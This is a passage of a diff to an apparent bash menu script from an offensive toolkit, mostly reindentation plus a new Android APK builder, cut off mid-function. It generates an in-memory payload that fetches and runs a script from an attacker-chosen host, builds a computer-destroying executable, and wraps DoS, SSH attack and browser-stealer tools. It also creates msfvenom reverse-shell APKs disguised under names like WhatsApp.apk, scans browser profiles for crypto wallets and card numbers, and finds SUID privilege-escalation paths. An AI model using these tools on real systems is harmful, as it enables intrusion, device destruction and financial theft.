-trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
-clear
-payloads_allshells_frame
-sleep 3
-start_files=$(ls "$PWD")
-DES_DIR="$Malware"
-export CSTK_MAIN_RUNNER=1
-openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$msb" -out "$make_shells_bin" -pass pass:"$pswd"
-bash "$make_shells_bin"
-rm -f "$make_shells_bin"
-end_files=$(ls "$PWD")
-new_files=$(comm -13 <(echo "$start_files" | sort) <(echo "$end_files" | sort))
-for file in $new_files; do
-	if [ -f "$file" ]; then
-		mv "$file" "$DES_DIR"
-	fi
-done
+    file="$make_shells_bin"
+    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
+    clear
+    payloads_allshells_frame
+    sleep 3
+    start_files=$(ls "$PWD")
+    DES_DIR="$Malware"
+    export CSTK_MAIN_RUNNER=1
+    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$msb" -out "$make_shells_bin" -pass pass:"$pswd"
+    bash "$make_shells_bin"
+    rm -f "$make_shells_bin"
+    end_files=$(ls "$PWD")
+    new_files=$(comm -13 <(echo "$start_files" | sort) <(echo "$end_files" | sort))
+    for file in $new_files; do
+    	if [ -f "$file" ]; then
+    		mv "$file" "$DES_DIR"
+    	fi
+    done
 
-wait_and_return
+    wait_and_return
 }
 
 # Class: PAYLOADS - Tool: no touch disk payload - Option 5
 no_touch_script() {
-file="$NoTouchScript"
-trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
-clear
-payloads_notouch_frame
-echo -e "$b \nIs website http or https:?"
-read -r -p "${c} ${A} ${x}" HTTP
-echo -e "$g \nEnter the host address where the target will get the in memory script from Example: 192.168.1.1 or google.com \n $x"
-read -r -p "${c} ${A} ${x}" HOST
-echo -e "$c \nEnter the script name for target to grab and run in memory Example: payload-in-memory.sh \n $x"
-read -r -p "${c} ${A} ${x}" SCRIPT
-openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$nts" -out "$ntso" -pass pass:"$pswd"
-base32hex -d "$ntso" | base64 -d | base32plain -d > "$NoTouchScript"
-template=$(cat "$NoTouchScript")
-script=$(echo "$template" | awk -v http="$HTTP" -v host="$HOST" -v script="$SCRIPT" '{ gsub(/HTTP/, http) ; gsub(/HOST/, host) ; gsub(/SCRIPT/, script) ; print }')
-echo "$script" > no_touch_disk.temp1
-rm -f "$ntso" "$NoTouchScript"
-#	bash-obfuscate -c 2 -r no_touch_disk.temp1 -o no_touch_disk.temp2
-#	echo '#!/bin/bash' > no_touch_disk.temp3
-#	cat no_touch_disk.temp2 >> no_touch_disk.temp3
-chmod 770 no_touch_disk.temp1
-shc -r -f no_touch_disk.temp1 -o "$Malware"/no_touch_disk_payload
-rm -rf no_touch_disk.*
-echo -e "\n\n $p File no_touch_disk_payload is available in the $Malware folder, change name and make executable before sending to target. $x \n"
-echo -e "\n Date: $DATE \nUser: $USER \n Program used: in memory payload \n Target script to grab and run: $HTTP://$HOST/$SCRIPT " >> "$log/no-touch-payload"
-if [[ "$comeback" = 1 ]]; then
-    return
-else
-    wait_and_return
-fi
+    A="$ap No Touch Disk ==> ${x}"
+    file="$NoTouchScript"
+    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
+    clear
+    payloads_notouch_frame
+    echo -e "$b \nIs website http or https:?"
+    read -r -p "${c} ${A} ${x}" HTTP
+    echo -e "$g \nEnter the host address where the target will get the in memory script from Example: 192.168.1.1 or google.com \n $x"
+    read -r -p "${c} ${A} ${x}" HOST
+    echo -e "$c \nEnter the script name for target to grab and run in memory Example: payload-in-memory.sh \n $x"
+    read -r -p "${c} ${A} ${x}" SCRIPT
+    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$nts" -out "$ntso" -pass pass:"$pswd"
+    base32hex -d "$ntso" | base64 -d | base32plain -d > "$NoTouchScript"
+    template=$(cat "$NoTouchScript")
+    script=$(echo "$template" | awk -v http="$HTTP" -v host="$HOST" -v script="$SCRIPT" '{ gsub(/HTTP/, http) ; gsub(/HOST/, host) ; gsub(/SCRIPT/, script) ; print }')
+    echo "$script" > no_touch_disk.temp1
+    rm -f "$ntso" "$NoTouchScript"
+    #	bash-obfuscate -c 2 -r no_touch_disk.temp1 -o no_touch_disk.temp2
+    #	echo '#!/bin/bash' > no_touch_disk.temp3
+    #	cat no_touch_disk.temp2 >> no_touch_disk.temp3
+    chmod 770 no_touch_disk.temp1
+    shc -r -f no_touch_disk.temp1 -o "$Malware"/no_touch_disk_payload
+    rm -rf no_touch_disk.*
+    echo -e "\n\n $p File no_touch_disk_payload is available in the $Malware folder, change name and make executable before sending to target. $x \n"
+    echo -e "\n Date: $DATE \nUser: $USER \n Program used: in memory payload \n Target script to grab and run: $HTTP://$HOST/$SCRIPT " >> "$log/no-touch-payload"
+    if [[ "$comeback" = 1 ]]; then
+        return
+    else
+        wait_and_return
+    fi
 }
 
 # Class: PAYLOADS - Tool: destroy this computer - Option 6
 destroy_computer() {
-file="$DestroyTheComputer"
-trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
-echo 'This creates a executable script that if ran will completely destroy the computer it is ran on ! THIS IS NO JOKE !'
-echo "Are you sure this is something you want to create and you will not use to harm others? Type a capital 'YES' if your sure and you understand i will not be held responsible."
-read -r -p "${c} ${A} ${x}" opt
-if [ "$opt" != YES ]; then
-	exit
-else
-	openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$dtc" -out "$dtco" -pass pass:"$pswd"
-	base32hex -d "$dtco" | base64 -d | base32plain -d > "$DestroyTheComputer"
-#		bash-obfuscate -c 2 -r "$DestroyTheComputer" -o destroy.temp
-#		echo '#!/bin/bash' > destroy.temp2
-#		cat destroy.temp >> destroy.temp2
-	shc -r -f "$DestroyTheComputer" -o "$Malware/CAUTION_DESTROY_COMPUTER"
-	rm -rf destroy.* *.x.c "$dtco" "$DestroyTheComputer"
-	echo "File name and location:  $Malware/CAUTION_DESTROY_COMPUTER"
-	echo -e "\n Date: $DATE \nUser: $USER \n Program used: destroy computer payloads class \n ""$USER"" has agreed to not use this script for malicious intent. " >> "$log/destroy_computer"
-fi
-wait_and_return
+    A="$ap Destroy Computer ==> ${x}"
+    file="$DestroyTheComputer"
+    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
+    echo 'This creates a executable script that if ran will completely destroy the computer it is ran on ! THIS IS NO JOKE !'
+    echo "Are you sure this is something you want to create and you will not use to harm others? Type a capital 'YES' if your sure and you understand i will not be held responsible."
+    read -r -p "${c} ${A} ${x}" opt
+    if [ "$opt" != YES ]; then
+    	exit
+    else
+    	openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$dtc" -out "$dtco" -pass pass:"$pswd"
+    	base32hex -d "$dtco" | base64 -d | base32plain -d > "$DestroyTheComputer"
+    #		bash-obfuscate -c 2 -r "$DestroyTheComputer" -o destroy.temp
+    #		echo '#!/bin/bash' > destroy.temp2
+    #		cat destroy.temp >> destroy.temp2
+    	shc -r -f "$DestroyTheComputer" -o "$Malware/CAUTION_DESTROY_COMPUTER"
+    	rm -rf destroy.* *.x.c "$dtco" "$DestroyTheComputer"
+    	echo "File name and location:  $Malware/CAUTION_DESTROY_COMPUTER"
+    	echo -e "\n Date: $DATE \nUser: $USER \n Program used: destroy computer payloads class \n ""$USER"" has agreed to not use this script for malicious intent. " >> "$log/destroy_computer"
+    fi
+    wait_and_return
 }
 
 # Class: PAYLOADS - Tool: DoS Bomb Attack - Option 7 (Wrapper used)
 dos_bomb_attack() {
-payloads_dosbomb_frame
-echo -e "$r \nThis attack doesn't create a script, Bombs are placed in the Loot folder and instructions are printed to the screen. $g \nContinue? (Y)es (N)o \n $x"
-read -r -p "${c} ${A} ${x}" bomb
-if [[ "$bomb" =~ [Nn]* ]]; then
-	wait_and_return
-elif [[ "$bomb" =~ [Yy]* ]]; then
-	export CSTK_MAIN_RUNNER=1
-	"$cstk_wrapper" "$dos_bombs_bin"
-	wait_and_return
-else
-	dos_bomb_attack
-fi
+    A="$ap DOS Attack ==> ${x}"
+    payloads_dosbomb_frame
+    echo -e "$r \nThis attack doesn't create a script, Bombs are placed in the Loot folder and instructions are printed to the screen. $g \nContinue? (Y)es (N)o \n $x"
+    read -r -p "${c} ${A} ${x}" bomb
+    if [[ "$bomb" =~ [Nn]* ]]; then
+    	wait_and_return
+    elif [[ "$bomb" =~ [Yy]* ]]; then
+    	export CSTK_MAIN_RUNNER=1
+    	"$cstk_wrapper" "$dos_bombs_bin"
+    	wait_and_return
+    else
+    	dos_bomb_attack
+    fi
 }
 
 # Class: PAYLOADS - Tool: SSH Attack - Option 8 (Wrapper used)
 ssh_attack() {
-payloads_sshattack_frame
-sleep 3
-export CSTK_MAIN_RUNNER=1
-"$cstk_wrapper" "$ssh_attack_bin"
-if [[ "$comeback" = 1 ]]; then
-    return
-else
-    wait_and_return
-fi
+    payloads_sshattack_frame
+    sleep 3
+    export CSTK_MAIN_RUNNER=1
+    "$cstk_wrapper" "$ssh_attack_bin"
+    if [[ "$comeback" = 1 ]]; then
+        return
+    else
+        wait_and_return
+    fi
 }
 
-# Class: PAYLOADS - Tool: metasploit (msfvenom) shell creater - Option 9 9Wrapper used)
+# Class: PAYLOADS - Tool: metasploit (msfvenom) shell creater - Option 9 (Wrapper used)
 msf_payloads() {
-payloads_msf_frame
-sleep 3
-getip
-export CSTK_MAIN_RUNNER=1
-"$cstk_wrapper" "$msfvenom_bin"
-wait_and_return
+    payloads_msf_frame
+    sleep 3
+    getip
+    export CSTK_MAIN_RUNNER=1
+    "$cstk_wrapper" "$msfvenom_bin"
+    wait_and_return
+}
+
+# Class: PAYLOADS - Tool: APK Builder (msfvenom) - Option A (Wrapper used)
+apk_killer() {
+    clear
+    A="$ap APK Builder ==> ${x}"
+    payloads_apk_frame
+    sleep 3
+    export CSTK_MAIN_RUNNER=1
+    echo -e "\nChoose connection type:\n1) Meterpreter\n2) Shell\n"
+    read -r -n 1 -p "${c} ${A} ${x}" con
+    if [[ "$con" = 1 ]]; then
+        type="meterpreter"
+    elif [[ "$con" = 2 ]]; then
+        type="shell"
+    else
+        echo "Bad Option"
+        exit
+    fi
+    clear
+    echo -e "\nChoose connection method:\n1) tcp\n2) http\n3) https\n"
+    read -r -n 1 -p "${c} ${A} ${x}" met
+    if [[ "$met" = 1 ]]; then
+        payload="android/$type/reverse_tcp"
+    elif [[ "$met" = 2 ]]; then
+        payload="android/$type/reverse_http"
+    elif [[ "$met" = 3 ]]; then
+        payload="android/$type/reverse_https"
+    else
+        echo "Bad Option"
+        exit
+    fi
+    clear
+    echo -e "\nEnter IP Address for malware script to connect back to:\n"
+    read -r -p "${c} ${A} ${x}" ipa
+    clear
+    echo -e "\nEnter port number to use: (1-65535)\n"
+    read -r -p "${c} ${A} ${x}" ipp
+    clear
+    echo -e "\nEnter finished apk app name to use\nExample: WhatsApp.apk\n"
+    read -r -p "${c} ${A} ${x}" file
+    export CSTK_MAIN_RUNNER=1
+    "$cstk_wrapper" "$apk_builder_bin" -p $payload LHOST=$ipa LPORT=$ipp -o $file
+    wait_and_return
 }
 
 ################################# POST EXPLOIT TOOLS ###############################
 
 # Class: POST EXPLOIT - Tools: Check if VM - Option 1
 check_vm() {
-clear
-postx_vm_frame
-exit_or_stay() {
-    echo "Exit system or stay? "
-    echo -e "1) Exit Now\n2) Stay Here"
-    read -r -n 1 -p "${c} ${A} ${x}" goon
-    if [[ "$goon" = 1 ]]; then
-        exit
-    elif [[ "$goon" = 2 ]]; then
-        echo "Remember this maybe a honeypot dont run commands you dont want others to see"
-    else
-        echo "Bad Option, try again."
-        exit_or_stay
-    fi
-}
+    A="$ax Check For VM ==> ${x}"
+    clear
+    postx_vm_frame
+    exit_or_stay() {
+        echo "Exit system or stay? "
+        echo -e "1) Exit Now\n2) Stay Here"
+        read -r -n 1 -p "${c} ${A} ${x}" goon
+        if [[ "$goon" = 1 ]]; then
+            exit
+        elif [[ "$goon" = 2 ]]; then
+            echo "Remember this maybe a honeypot dont run commands you dont want others to see"
+        else
+            echo "Bad Option, try again."
+            exit_or_stay
+        fi
+    }
 
-# Check DMI information for VM-related product names
-if  grep -qE "(VMware|VirtualBox|QEMU|KVM|Xen|Parallels|Microsoft)" /sys/class/dmi/id/product_name 2>/dev/null ||
-    grep -qE "(VMware|VirtualBox|QEMU|KVM|Xen|Parallels|Microsoft)" /sys/class/dmi/id/sys_vendor 2>/dev/null; then
-    echo "VM detected via DMI product name or sys_vendor."
-    exit_or_stay
-fi
-# Check CPU flags for hypervisor presence
-if grep -q "^flags.*hypervisor" /proc/cpuinfo; then
-    echo "VM detected via CPU hypervisor flag."
-    exit_or_stay
-fi
-# Check manufacturer name using dmidecode (requires root)
-if command -v dmidecode &>/dev/null; then
-    if dmidecode -s system-manufacturer 2>/dev/null | grep -qiE "(VMware|VirtualBox|QEMU|Xen|Microsoft)"; then
-        echo "VM detected via dmidecode system manufacturer."
+    # Check DMI information for VM-related product names
+    if  grep -qE "(VMware|VirtualBox|QEMU|KVM|Xen|Parallels|Microsoft)" /sys/class/dmi/id/product_name 2>/dev/null ||
+        grep -qE "(VMware|VirtualBox|QEMU|KVM|Xen|Parallels|Microsoft)" /sys/class/dmi/id/sys_vendor 2>/dev/null; then
+        echo "VM detected via DMI product name or sys_vendor."
         exit_or_stay
     fi
-fi
-# Check MAC addresses (VMs often use known MAC ranges)
-if ip link show | grep -qE "00:05:69|00:1C:14|00:0C:29|00:50:56|00:16:3E|08:00:27"; then
-    echo "VM detected via MAC address."
-    exit_or_stay
-fi
-# Check for common VM-specific modules
-if lsmod | grep -qE "(vmw_balloon|vboxguest|xen_blkfront|xen_netfront|kvm)"; then
-    echo "VM detected via loaded kernel modules."
-    exit_or_stay
-fi
-echo "If no Warnings where given then No VM detected."
-wait_and_return
+    # Check CPU flags for hypervisor presence
+    if grep -q "^flags.*hypervisor" /proc/cpuinfo; then
+        echo "VM detected via CPU hypervisor flag."
+        exit_or_stay
+    fi
+    # Check manufacturer name using dmidecode (requires root)
+    if command -v dmidecode &>/dev/null; then
+        if dmidecode -s system-manufacturer 2>/dev/null | grep -qiE "(VMware|VirtualBox|QEMU|Xen|Microsoft)"; then
+            echo "VM detected via dmidecode system manufacturer."
+            exit_or_stay
+        fi
+    fi
+    # Check MAC addresses (VMs often use known MAC ranges)
+    if ip link show | grep -qE "00:05:69|00:1C:14|00:0C:29|00:50:56|00:16:3E|08:00:27"; then
+        echo "VM detected via MAC address."
+        exit_or_stay
+    fi
+    # Check for common VM-specific modules
+    if lsmod | grep -qE "(vmw_balloon|vboxguest|xen_blkfront|xen_netfront|kvm)"; then
+        echo "VM detected via loaded kernel modules."
+        exit_or_stay
+    fi
+    echo "If no Warnings where given then No VM detected."
+    wait_and_return
 }
 
 # Class: POST EXPLOIT - Tool: Web Browser Info Stealer - Option 2 (Wrapper used)
 browser_data_wrapper() {
-clear
-postx_browserthief_frame
-sleep 3
-export CSTK_MAIN_RUNNER=1
-"$cstk_wrapper" "$browser_stealer_bin"
-wait_and_return
+    clear
+    postx_browserthief_frame
+    sleep 3
+    export CSTK_MAIN_RUNNER=1
+    "$cstk_wrapper" "$browser_stealer_bin"
+    wait_and_return
 }
 
 # Class: POST EXPLOIT - Tool: Crypto Finder - Option 3
 crypto_catch() {
-clear
-postx_crypto_frame
-export CSTK_MAIN_RUNNER=1
-# Prompt the user for a scan type
-echo -e "$c Do you want to run a default scan (search common browser locations) or specify a custom file? (default/custom) $x"
-read -r -p "${r} ${A} ${x}" scan_choice
+    A="$ax Crypto Search ==> ${x}"
+    clear
+    postx_crypto_frame
+    export CSTK_MAIN_RUNNER=1
+    # Prompt the user for a scan type
+    echo -e "$c Do you want to run a default scan (search common browser locations) or specify a custom file? (default/custom) $x"
+    read -r -p "${r} ${A} ${x}" scan_choice
 
-if [[ "$scan_choice" == "default" ]]; then
-	echo -e "$c Running default scan...$x"
-	run_default_scan
-else
-	echo -e "$c Enter path to check for crypto data: $x"
-	read -e -r -p "${r} ${A} ${x}" path_to_your_data_file
-	run_custom_scan "$path_to_your_data_file"
-fi
-
-# Function to handle default scan for common browser locations
-run_default_scan() {
-	declare -A browser_paths
-	home="$HOME"
-	browser_paths=(
-    [Firefox]="$home/.mozilla/firefox/*.default-release/"
-    [Chrome]="$home/.config/google-chrome/Default/"
-    [Brave]="$home/.config/BraveSoftware/Brave-Browser/Default/"
-    [Opera]="$home/.config/opera/"
-    [Edge]="$home/.config/microsoft-edge/Default/"
-    [Safari]="$home/Library/Safari/"
-    [Vivaldi]="$home/.config/vivaldi/Default/"
-    [DuckDuckGo]="$home/.config/duckduckgo/"
-)
-
-for browser in "${!browser_paths[@]}"; do
-    local data_file="${browser_paths[$browser]}"
-    echo -e "$g Checking $browser data in: $data_file $x"
-    if [[ -d "$data_file" ]]; then
-        process_files "$data_file"
+    if [[ "$scan_choice" == "default" ]]; then
+    	echo -e "$c Running default scan...$x"
+    	run_default_scan
     else
-        echo -e "$r $browser data not found. $x"
+    	echo -e "$c Enter path to check for crypto data: $x"
+    	read -e -r -p "${r} ${A} ${x}" path_to_your_data_file
+    	run_custom_scan "$path_to_your_data_file"
     fi
-done
-}
 
-# Function to handle custom file scan
-run_custom_scan() {
-local data_file="$1"
-if [[ ! -f "$data_file" ]]; then
-    echo -e "$r File not found. Exiting... $x"
-    return
-fi
-process_files "$data_file"
-}
+    # Function to handle default scan for common browser locations
+    run_default_scan() {
+    	declare -A browser_paths
+    	home="$HOME"
+    	browser_paths=(
+        [Firefox]="$home/.mozilla/firefox/*.default-release/"
+        [Chrome]="$home/.config/google-chrome/Default/"
+        [Brave]="$home/.config/BraveSoftware/Brave-Browser/Default/"
+        [Opera]="$home/.config/opera/"
+        [Edge]="$home/.config/microsoft-edge/Default/"
+        [Safari]="$home/Library/Safari/"
+        [Vivaldi]="$home/.config/vivaldi/Default/"
+        [DuckDuckGo]="$home/.config/duckduckgo/"
+    )
 
-# Function to process files for crypto wallet data
-process_files() {
-local file_path="$1"
-grep -oP ".+" "$file_path"* 2>/dev/null | while IFS= read -r line; do
-    [[ -z "$line" || "$line" =~ ^# ]] && continue
-    process_line "$line"
-done
-}
+    for browser in "${!browser_paths[@]}"; do
+        local data_file="${browser_paths[$browser]}"
+        echo -e "$g Checking $browser data in: $data_file $x"
+        if [[ -d "$data_file" ]]; then
+            process_files "$data_file"
+        else
+            echo -e "$r $browser data not found. $x"
+        fi
+    done
+    }
 
-# Declare supported crypto regex patterns
-declare -A crypto
-crypto=(
-[BTC]="1[a-zA-HJ-NP-Z1-9]{25,29}|3[a-zA-HJ-NP-Z0-9]{25,29}|bc1[a-zA-HJ-NP-Z0-9]{25,29}"
-[ETH]="0x[a-fA-F0-9]{40}"
-[XMR]="4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}|8[0-9AB][1-9A-HJ-NP-Za-km-z]{93}"
-[XRP]="r[0-9a-zA-Z]{24,34}"
-[BCH]="1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|q[a-z0-9]{41}|p[a-z0-9]{41}"
-[LTC]="L[a-km-zA-HJ-NP-Z1-9]{26,33}|M[a-km-zA-HJ-NP-Z1-9]{26,33}|3[a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1q[a-km-zA-HJ-NP-Z1-9]{26,33}"
-[DOGE]="D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}"
-[ZEC]="t1[a-km-zA-HJ-NP-Z1-9]{33}"
-[DASH]="X[1-9A-HJ-NP-Za-km-z]{33}"
-[RON]="ronin:[a-fA-F0-9]{40}"
-[TRX]="T[A-Za-z1-9]{33}"
-[STEAM]="http[s]*:\/\/steamcommunity.com\/tradeoffer\/new\/\?partner=([0-9]+)&token=([a-zA-Z0-9]+)"
-[MSTCD]="[51-55]\d{14}"
-[VISA]="4\d{15}|4\d{12}"
-[DISCOVER]="6011\d{12}|65\d{14}"
-[AMEXP]="34\d{13}|37\d{13}"
-[DINCLUB]="[300-305]\d{11}|36\d{12}|38\d{12}"
-[JCB]="35\d{14}|2131\d{11}|1800\d{11}"
-)
-
-# Function to process each line of a file
-process_line() {
-local line="$1"
-for key in "${!crypto[@]}"; do
-    if [[ "$line" =~ ${crypto[$key]} ]]; then
-        echo -e "$r $key $g Address found:$r $line $x"
-        log_result "$key" "$line"
+    # Function to handle custom file scan
+    run_custom_scan() {
+    local data_file="$1"
+    if [[ ! -f "$data_file" ]]; then
+        echo -e "$r File not found. Exiting... $x"
         return
     fi
-done
-echo -e "No match found: $line" > /dev/null
-log_result "No Match" "$line"
-}
+    process_files "$data_file"
+    }
 
-# Function to log results
-log_result() {
-local status="$1"
-local line="$2"
-local log_dir="$log/cryptosearch.log"
-echo -e "\n\nDate and Time: $(date) \nUser's Name: $USER \nSTATUS: $status Address found: $line" >> "$log_dir"
-}
-wait_and_return
+    # Function to process files for crypto wallet data
+    process_files() {
+    local file_path="$1"
+    grep -oP ".+" "$file_path"* 2>/dev/null | while IFS= read -r line; do
+        [[ -z "$line" || "$line" =~ ^# ]] && continue
+        process_line "$line"
+    done
+    }
+
+    # Declare supported crypto regex patterns
+    declare -A crypto
+    crypto=(
+    [BTC]="1[a-zA-HJ-NP-Z1-9]{25,29}|3[a-zA-HJ-NP-Z0-9]{25,29}|bc1[a-zA-HJ-NP-Z0-9]{25,29}"
+    [ETH]="0x[a-fA-F0-9]{40}"
+    [XMR]="4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}|8[0-9AB][1-9A-HJ-NP-Za-km-z]{93}"
+    [XRP]="r[0-9a-zA-Z]{24,34}"
+    [BCH]="1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|q[a-z0-9]{41}|p[a-z0-9]{41}"
+    [LTC]="L[a-km-zA-HJ-NP-Z1-9]{26,33}|M[a-km-zA-HJ-NP-Z1-9]{26,33}|3[a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1q[a-km-zA-HJ-NP-Z1-9]{26,33}"
+    [DOGE]="D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}"
+    [ZEC]="t1[a-km-zA-HJ-NP-Z1-9]{33}"
+    [DASH]="X[1-9A-HJ-NP-Za-km-z]{33}"
+    [RON]="ronin:[a-fA-F0-9]{40}"
+    [TRX]="T[A-Za-z1-9]{33}"
+    [STEAM]="http[s]*:\/\/steamcommunity.com\/tradeoffer\/new\/\?partner=([0-9]+)&token=([a-zA-Z0-9]+)"
+    [MSTCD]="[51-55]\d{14}"
+    [VISA]="4\d{15}|4\d{12}"
+    [DISCOVER]="6011\d{12}|65\d{14}"
+    [AMEXP]="34\d{13}|37\d{13}"
+    [DINCLUB]="[300-305]\d{11}|36\d{12}|38\d{12}"
+    [JCB]="35\d{14}|2131\d{11}|1800\d{11}"
+    )
+
+    # Function to process each line of a file
+    process_line() {
+    local line="$1"
+    for key in "${!crypto[@]}"; do
+        if [[ "$line" =~ ${crypto[$key]} ]]; then
+            echo -e "$r $key $g Address found:$r $line $x"
+            log_result "$key" "$line"
+            return
+        fi
+    done
+    echo -e "No match found: $line" > /dev/null
+    log_result "No Match" "$line"
+    }
+
+    # Function to log results
+    log_result() {
+    local status="$1"
+    local line="$2"
+    local log_dir="$log/cryptosearch.log"
+    echo -e "\n\nDate and Time: $(date) \nUser's Name: $USER \nSTATUS: $status Address found: $line" >> "$log_dir"
+    }
+    wait_and_return
 }
 
 # Class: POST EXPLOIT - Tool: File Permissions Exploit - Option 4
 check_gtfob() {
-clear
-postx_filex_frame
-sleep 3
-# Ensure GTFOB.py is available
-if ! command -v python3 &> /dev/null || [ ! -f "$GTFOB" ]; then
-echo -e "$r \nPython3 not found. Script failed to run $x"
-exit 4
+    clear
+    postx_filex_frame
+    sleep 3
+    # Ensure GTFOB.py is available
+    if ! command -v python3 &> /dev/null || [ ! -f "$GTFOB" ]; then
+    echo -e "$r \nPython3 not found. Script failed to run $x"
+    exit 4
 
-fi
-# Variable to pull user's executable PATH's directories
-IFS=':' read -r -a P <<< "$PATH"
-
-# Find files with SUID enabled in PATH directories, suppressing errors
-hazard=$(find "${P[@]}" -type f -perm -u+s -exec basename {} \; 2>/dev/null)
-
-# Fetch the list of GTFOBins entries, suppressing errors
-fix=$(python3 "$GTFOB" -s 2>/dev/null | tr -d '*"-,_|/\\)$' | tail -n +1 | tr ' ' "\n")
-
-# Use arrays for better handling
-readarray -t hazard_array <<< "$hazard"
-readarray -t fix_array <<< "$fix"
-
-# Find matching file names for privilege escalation
-solution=$(comm -12 <(printf '%s\n' "${hazard_array[@]}" | sort) <(printf '%s\n' "${fix_array[@]}" | sort))
-
-# Check if any solution found
-if [ -z "$solution" ]; then
-echo -e "$r Nothing Found $x"
-echo -e "Date and Time: $DATE \nUser's Name: $USER \nScript Ran: GTFOB - Privilege Escalation script to search for bad or misconfigured file permissions \nNO EXPLOITS FOUND. \n "   >> "$log/GTFOB.log"
-else
-echo -e "$r Found Possible Privilege Escalation Executable(s): $x"
-for sol in $solution; do
-    # Get the attack type and exploitation command
-    issue=$(python3 "$GTFOB" --bin "$sol" | grep "Attack Type:")
-    command=$(python3 "$GTFOB" --bin "$sol" | grep --after-context 10 "Code:")
-    if [ -n "$issue" ]; then
-        touch "$Loot/GTFOB.txt"
-        echo -e "$c PrivEx is in $r $sol $x" | tee -a "$Loot/GTFOB.txt"
-        echo -e "$c Maybe abused with exploit $r $issue $x" | tee -a "$Loot/GTFOB.txt"
-        echo -e "$c Can be exploited by running the command: $r $command $x" | tee -a "$Loot/GTFOB.txt"
-        echo -e "Date and Time: $DATE \nUser's Name: $USER \nScript Ran: GTFOB - Privilege Escalation script to search for bad or misconfigured file permissions \nFOUND: $sol \nABUSE: $issue \nEXPLOIT: $command"   >> "$log/GTFOB.log"
     fi
-done
-fi
+    # Variable to pull user's executable PATH's directories
+    IFS=':' read -r -a P <<< "$PATH"
 
-wait_and_return
+    # Find files with SUID enabled in PATH directories, suppressing errors
+    hazard=$(find "${P[@]}" -type f -perm -u+s -exec basename {} \; 2>/dev/null)
+
+    # Fetch the list of GTFOBins entries, suppressing errors
+    fix=$(python3 "$GTFOB" -s 2>/dev/null | tr -d '*"-,_|/\\)$' | tail -n +1 | tr ' ' "\n")
+
+    # Use arrays for better handling
+    readarray -t hazard_array <<< "$hazard"
+    readarray -t fix_array <<< "$fix"
+
+    # Find matching file names for privilege escalation
+    solution=$(comm -12 <(printf '%s\n' "${hazard_array[@]}" | sort) <(printf '%s\n' "${fix_array[@]}" | sort))
+
+    # Check if any solution found
+    if [ -z "$solution" ]; then
+    echo -e "$r Nothing Found $x"
+    echo -e "Date and Time: $DATE \nUser's Name: $USER \nScript Ran: GTFOB - Privilege Escalation script to search for bad or misconfigured file permissions \nNO EXPLOITS FOUND. \n "   >> "$log/GTFOB.log"
+    else
+    echo -e "$r Found Possible Privilege Escalation Executable(s): $x"
+    for sol in $solution; do
+        # Get the attack type and exploitation command
+        issue=$(python3 "$GTFOB" --bin "$sol" | grep "Attack Type:")
+        command=$(python3 "$GTFOB" --bin "$sol" | grep --after-context 10 "Code:")
+        if [ -n "$issue" ]; then
+            touch "$Loot/GTFOB.txt"
+            echo -e "$c PrivEx is in $r $sol $x" | tee -a "$Loot/GTFOB.txt"
+            echo -e "$c Maybe abused with exploit $r $issue $x" | tee -a "$Loot/GTFOB.txt"
+            echo -e "$c Can be exploited by running the command: $r $command $x" | tee -a "$Loot/GTFOB.txt"
+            echo -e "Date and Time: $DATE \nUser's Name: $USER \nScript Ran: GTFOB - Privilege Escalation script to search for bad or misconfigured file permissions \nFOUND: $sol \nABUSE: $issue \nEXPLOIT: $command"   >> "$log/GTFOB.log"
+        fi
+    done
+    fi
+
+    wait_and_return
 }
 
 # Class: POST EXPLOIT - Tool: Kernel Exploit - Option 5 (Wrapper Used)
 linux_exploits_check() {
-file="$linux_exploit_checker_bin"
-trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
-clear
-postx_kernalx_frame
-sleep 3
-echo -e "\nWould you like to check for: \n1 - kernel vulnabilities \n2 - userland vulnabilites \n3 - both 1 and 2 \n4 - exit to main menu \n"
-read -r -n 1 -p "${c} ${A} ${x}" rk
-[[ "$rk" -ge 4 ]] && wait_and_return
-echo -e "\nDo you want a listing of other possible security related issues? Y/N \n"
-read -r -n 1 -p "${c} ${A} ${x}" list
-echo -e "\nIf any vulnabilities are found do you want a automatic download of the exploit script? \nExploits may be either source code or in binary format Y/N ?\n"
-read -r -n 1 -p "${c} ${A} ${x}" down
-export CSTK_MAIN_RUNNER=1
-touch "$Loot/Exploit_Searcher.txt"
-openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$lecb" -out "$linux_exploit_checker_bin" -pass pass:"$pswd"
-if [[ "$rk" -eq 3 ]]; then
-	if [[ "$down" =~ [Yy] ]]; then
-		if [[ "$list" =~ [Yy] ]]; then
-			bash "$linux_exploit_checker_bin" -b -s --checksec | tee -a "$Loot/Exploit_Searcher.txt"
-		elif [[ "$list" =~ [Nn] ]]; then
-			bash "$linux_exploit_checker_bin" -b -s | tee -a "$Loot/Exploit_Searcher.txt"
-		else
-			echo "Bad Option" && linux_exploit_check
-		fi
-	elif [[ "$down" =~ [Nn] ]]; then
-		if [[ "$list" =~ [Yy] ]]; then
-			bash "$linux_exploit_checker_bin" --checksec | tee -a "$Loot/Exploit_Searcher.txt"
-		elif [[ "$list" =~ [Nn] ]]; then
-			bash "$linux_exploit_checker_bin" | tee -a "$Loot/Exploit_Searcher.txt"
-		else
-			echo "Bad Option" && linux_exploit_check
-		fi
-	else
